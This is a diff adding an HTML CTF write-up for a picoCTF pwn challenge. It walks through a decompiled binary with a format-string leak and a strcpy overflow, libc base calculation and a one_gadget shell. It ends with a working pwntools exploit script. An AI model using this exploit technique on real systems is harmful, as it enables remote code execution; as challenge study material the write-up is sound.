@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>milkbomb11</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+
+    <header>
+        <h1>milkbomb11</h1>
+        <a href="/index.html">[to index]</a>
+    </header>
+
+    <main>
+        <p>The binary can be downloaded 
+            <a href="https://challenge-files.picoctf.net/c_wily_courier/4e11fc837bac7289d9fd062c4c678ac71af390b44080ed68fd60427b11e96107/gauntlet">here</a>, 
+            and the libc can be downloaded 
+            <a href="https://challenge-files.picoctf.net/c_wily_courier/4e11fc837bac7289d9fd062c4c678ac71af390b44080ed68fd60427b11e96107/libc-2.27.so">here</a>.
+        </p>
+        <p>The source code wasn't provided so I had to decompile the binary as below.</p>
+        <pre><code>
+undefined8 main(void)
+{
+  char local_78 [104];
+  char *local_10;
+  
+  local_10 = malloc(1000);
+  fgets(local_10,1000,stdin);
+  local_10[999] = '\0';
+  printf(local_10);
+  fflush(stdout);
+  fgets(local_10,1000,stdin);
+  local_10[999] = '\0';
+  strcpy(local_78,local_10);
+  return 0;
+} 
+        </code></pre>
+        <p>
+            Running a checksec, I could see that the stack was unexecutable and NX was enabled.
+            I thought of abusing the fact that PIE was not enabled and injecting an ROP chain, but there was no way to overwrite the stack buffer past
+            a null byte because the function used to write to the stack was <code>strcpy</code>. Trying to overwrite the return address of <code>main</code>
+            with some address pointing to the .text section(0x40xxxxxx) kept causing a segfault since the original return address of <code>main</code> always pointed to
+            somewhere in libc(0x7fxxxxxxxxxx). 
+        </p> 
+        <img src="checksec.png" width="400px" height="auto">
+        <p>
+            I noticed a format string bug in the decompilation which could be used to leak the return address of <code>main</code> and thus libc base.
+            So using pwndbg I noticed that the offset of the return address was 0x21c87.
+        </p>
+        <img src="stack_gdb.png" width="600px" height="auto">
+        <img src="vmmap.png" width="600px" height="auto">
+        <p>After getting libc base, I could use one_gadget to get a gadget that would pop a shell. I used the third gadget in the image below.</p>
+        <img src="onegadget.png" width="800px" height="auto">
+        <p>The exploit code is as below.</p>
+        <pre><code>
+#!/usr/bin/python3
+from pwn import *
+
+def ex():
+    # context.log_level = "debug"
+    libc = ELF("./libc-2.27.so")        
+    e = ELF("./gauntlet")
+    p = remote("wily-courier.picoctf.net", 51546)
+    p.sendline(b"%23$p")
+    libc_base = int(p.recvline().strip(), 16) - 0x21c87
+    p.sendline(b"A"*0x78 + p64(libc_base + 0x4f302)) 
+    p.interactive()
+
+if __name__ == "__main__": ex()
+        </code></pre>
+    </main>
+</body>
+</html>
